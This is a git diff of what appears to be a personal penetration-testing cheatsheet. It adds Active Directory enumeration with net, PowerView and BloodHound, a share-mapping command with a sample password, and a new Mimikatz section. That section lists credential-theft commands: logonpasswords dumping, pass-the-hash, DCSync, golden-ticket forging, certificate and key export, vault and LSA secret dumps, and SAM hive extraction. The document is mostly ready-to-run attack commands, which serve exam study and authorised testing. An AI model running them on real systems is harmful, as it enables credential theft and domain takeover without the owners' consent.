@@ -21,6 +21,10 @@ Expect Spanglish, this is a cheatsheet.
    - [Service Binary Hijacking](#service-binary-hijacking)
    - [Service DLL Hijacking](#service-dll-hijacking)
    - [*SeImpersonatePrivilege*](#seimpersonateprivilege)
+- [AD Enumeration](#ad-enumeration)
+   - [Using Legacy Tools, Default Win Tools and Sysinternals tools](#using-legacy-tools-default-windows-tools-and-sysinternals-tools)
+   - [Using PowerView](#using-powerview)
+   - [Automated enumeration with Bloodhound](#automated-enumeration-through-bloodhound-and-its-data-collectors)
 - [Port Scanning](#port-scanning)
 - [Web Directory Scanning (and related)](#web-directory-scanning-and-related)
 - [DNS Enumeration](#dns-enumeration)
@@ -33,10 +37,8 @@ Expect Spanglish, this is a cheatsheet.
    - [Using Socat](#using-socat)
    - [Using OpenSSH](#using-openssh)
    - [Using Chisel](#using-chisel)
-- [AD Enumeration](#ad-enumeration)
-   - [Using Legacy Tools, Default Win Tools and Sysinternals tools](#using-legacy-tools-default-windows-tools-and-sysinternals-tools)
-   - [Using PowerView](#using-powerview)
-   - [Automated enumeration with Bloodhound](#automated-enumeration-through-bloodhound-and-its-data-collectors)
+- [Mimikatz](#mimikatz)
+
  
 
 ## Misc Commands from Linux
@@ -479,6 +481,126 @@ On vulnerable host:
 
 [Back to top](#index)
 
+
+## AD Enumeration
+
+### Using Legacy Tools, Default Windows Tools, and Sysinternals Tools
+
+```
+# List Domain users
+net user /domain
+
+# Get info about a specific User
+net user <username> /domain
+
+# List Domain groups
+net group /domain
+
+# Get info about a specific Domain Group
+net group <group_name> /domain
+
+# Check who is logged where PsLoggedOn from SysInternals
+.\PsLoggedon.exe \\<computer_dnshostname>
+
+# Enumerate SPN in the Domain
+setspn -L <username>
+```
+
+[Back to top](#index)
+
+### Using PowerView
+
+Some domains will require auth to perform the LDAP queries that PowerView performs. If so, use the *-Credential* flag passing as argument a PSCredentialObject.
+
+Steps to store creds in a PSCredentialObject are the following:
+
+```
+# Define Credentials
+[string]$user = 'admin'
+[string]$pass = 'mySuperSecurePassword'
+
+# Create credential Object
+[SecureString]$secureString = $pass | ConvertTo-SecureString -AsPlainText -Force 
+[PSCredential]$credentialObject = New-Object System.Management.Automation.PSCredential -ArgumentList $user, $secureString
+```
+
+Now you are ready to keep enumerating domain objects.
+
+```
+# Domain Information
+Get-NetDomain
+
+# Domain User objects
+Get-NetUSer
+
+# Domain Users cn attribute
+Get-NetUser | select cn
+
+# Domain Users cn,pwdlastset and lastlogon attributes
+Get-NetUSer | select cn,pwdlastset,lastlogon
+
+# Domain Groups cn attribute
+Get-NetGroup | select cn
+
+# Members of a Domain Group
+Get-NetGroup "<group_name>" | select member
+
+# Computes on the Domain
+Get-NetComputer
+
+# Domain Computers DNSHostName, Operating System and OS Version
+Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
+
+# Check wether a compromised user has LocalAdminRights on other computers of the domain
+Find-LocalAdminAccess
+
+# Check who is logged where (uses 2 Windows API, NetWkstaUserEnum (requires administrative privs) and NetSessionEnum)
+Get-NetSession -ComputerName <computer_dnshostname> -Verbose
+
+# Enumerate Domain SPN's
+Get-NetUser -SPN | select camaccountname,serviceprincipalname
+
+# Get an Object's Access Control List
+get-acl -identity samaccountname
+
+# From previous ouput, important attributes are
+- ObjectSID: object which the ACL refers to
+- ActiveDirectoryRights: type of permission applied to the object.
+- SecurityIdentifier: the user object that has the permissions stated in ActiveDirectoryRights over the object.
+
+# To make SIDs human-readable:
+Convert-SidToName <sid_value>
+
+# Find shares in the domain
+Find-DomainShare
+
+```
+
+[Back to top](#index)
+
+### Automated Enumeration through Bloodhound and its Data Collectors
+
+More Information about [BloodHound](https://bloodhound.readthedocs.io/en/latest/data-analysis/bloodhound-gui.html) and [Sharphound Collector](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html)
+
+Is is important to check that the Active Sessions information is correctly collected. The collection methods that are included in the DEFAULT and ALL options do not include LOGGEDON because it need to be executed with Local Admin Rights.
+
+Also, the SESSIONS collection method works better if it is combined with the --Loop option (loop duration can also be specified using --LoopDuration)
+
+```
+# Collect Data From a Non-Domain-Joined Computer (our kali)
+bloodhound-python -d <domain> -u <username> -p <password> -gc <global_catalog_host> -c all -ns <nameserver_ip>
+
+# Collect Active Sessions Data through proxychains (observe the flag --dns-tcp)
+proxychains -q bloodhound-python -d <domain> -u <username> -p <password> -c LoggedOn -ns <dns_server_ip> -dc <dc_ip> --dns-tcp
+
+# Collect Data From a Compromised Domain-Joined Computer
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"    # Using PowerShell Module Sharphound.ps1
+.\sharphound.exe -CollectionMethods ALL    # Using sharphound.exe
+
+```
+
+[Back to top](#index)
+
 ## Port Scanning
 
 This only contains what I normally use, there are more options available at [S4vitar - Preparación OSCP - Port Scanning](https://gist.github.com/s4vitar/b88fefd5d9fbbdcc5f30729f7e06826e#port-scanning)
@@ -644,6 +766,8 @@ crackmapexec smb <ip_address> -u <users_file> -p <password> --continue-on-succes
 crackmapexec smb 192.168.10.11 [-d Domain] -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
 crackmapexec smb 192.168.10.11 [-d Domain] -u Administrator -H <NTHASH> -x whoami
 
+# Add a new share
+NET USE f: \\SRVDC\Datos /PERSISTENT:YES /user:dom\Admin P@ssword
 ```
 
 [Back to top](#index)
@@ -874,122 +998,57 @@ On Machine_A, execute:
 
 [Back to top](#index)
 
-## AD Enumeration
 
-### Using Legacy Tools, Default Windows Tools, and Sysinternals Tools
+## Mimikatz
 
-```
-# List Domain users
-net user /domain
-
-# Get info about a specific User
-net user <username> /domain
-
-# List Domain groups
-net group /domain
-
-# Get info about a specific Domain Group
-net group <group_name> /domain
-
-# Check who is logged where PsLoggedOn from SysInternals
-.\PsLoggedon.exe \\<computer_dnshostname>
-
-# Enumerate SPN in the Domain
-setspn -L <username>
-```
-
-[Back to top](#index)
-
-### Using PowerView
-
-Some domains will require auth to perform the LDAP queries that PowerView performs. If so, use the *-Credential* flag passing as argument a PSCredentialObject.
-
-Steps to store creds in a PSCredentialObject are the following:
+### Sekurlsa
 
 ```
-# Define Credentials
-[string]$user = 'admin'
-[string]$pass = 'mySuperSecurePassword'
-
-# Create credential Object
-[SecureString]$secureString = $pass | ConvertTo-SecureString -AsPlainText -Force 
-[PSCredential]$credentialObject = New-Object System.Management.Automation.PSCredential -ArgumentList $user, $secureString
+sekurlsa::logonpasswords
+sekurlsa::tickets /export
+sekurlsa::pth /user:Administrator /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
+lsadump::dcsync /domain:pentestlab.local /all /csv
 ```
 
-Now you are ready to keep enumerating domain objects.
+### Kerberos
 
 ```
-# Domain Information
-Get-NetDomain
-
-# Domain User objects
-Get-NetUSer
-
-# Domain Users cn attribute
-Get-NetUser | select cn
-
-# Domain Users cn,pwdlastset and lastlogon attributes
-Get-NetUSer | select cn,pwdlastset,lastlogon
-
-# Domain Groups cn attribute
-Get-NetGroup | select cn
-
-# Members of a Domain Group
-Get-NetGroup "<group_name>" | select member
-
-# Computes on the Domain
-Get-NetComputer
-
-# Domain Computers DNSHostName, Operating System and OS Version
-Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
-
-# Check wether a compromised user has LocalAdminRights on other computers of the domain
-Find-LocalAdminAccess
-
-# Check who is logged where (uses 2 Windows API, NetWkstaUserEnum (requires administrative privs) and NetSessionEnum)
-Get-NetSession -ComputerName <computer_dnshostname> -Verbose
-
-# Enumerate Domain SPN's
-Get-NetUser -SPN | select camaccountname,serviceprincipalname
-
-# Get an Object's Access Control List
-get-acl -identity samaccountname
-
-# From previous ouput, important attributes are
-- ObjectSID: object which the ACL refers to
-- ActiveDirectoryRights: type of permission applied to the object.
-- SecurityIdentifier: the user object that has the permissions stated in ActiveDirectoryRights over the object.
-
-# To make SIDs human-readable:
-Convert-SidToName <sid_value>
-
-# Find shares in the domain
-Find-DomainShare
-
-
+kerberos::list /export
+kerberos::ptt c:\chocolate.kirbi
+kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
 ```
 
-[Back to top](#index)
-
-### Automated Enumeration through Bloodhound and its Data Collectors
-
-More Information about [BloodHound](https://bloodhound.readthedocs.io/en/latest/data-analysis/bloodhound-gui.html) and [Sharphound Collector](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html)
-
-Is is important to check that the Active Sessions information is correctly collected. The collection methods that are included in the DEFAULT and ALL options do not include LOGGEDON because it need to be executed with Local Admin Rights.
-
-Also, the SESSIONS collection method works better if it is combined with the --Loop option (loop duration can also be specified using --LoopDuration)
+### Crypto
 
 ```
-# Collect Data From a Non-Domain-Joined Computer (our kali)
-bloodhound-python -d <domain> -u <username> -p <password> -gc <global_catalog_host> -c all -ns <nameserver_ip>
+crypto::capi
+crypto::cng
+crypto::certificates /export
+crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
+crypto::keys /export
+crypto::keys /machine /export
+```
 
-# Collect Active Sessions Data through proxychains (observe the flag --dns-tcp)
-proxychains -q bloodhound-python -d <domain> -u <username> -p <password> -c LoggedOn -ns <dns_server_ip> -dc <dc_ip> --dns-tcp
+### Vault&LSADump
 
-# Collect Data From a Compromised Domain-Joined Computer
-Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"    # Using PowerShell Module Sharphound.ps1
-.\sharphound.exe -CollectionMethods ALL    # Using sharphound.exe
+```
+vault::cred
+vault::list
+token::elevate
+vault::cred
+vault::list
+lsadump::sam
+lsadump::secrets
+lsadump::cache
+token::revert
+lsadump::dcsync /user:domain\krbtgt /domain:lab.local
+```
+#### Dumping hashes lsadump
 
+```
+reg save HKLM\SAM SamWeb02Backup.hiv
+reg save HKLM\SYSTEM SystemWeb02Backup.hiv
+lsadump::sam SystemWeb02Backup.hiv SamWeb02Backup.hiv
 ```
 
 [Back to top](#index)
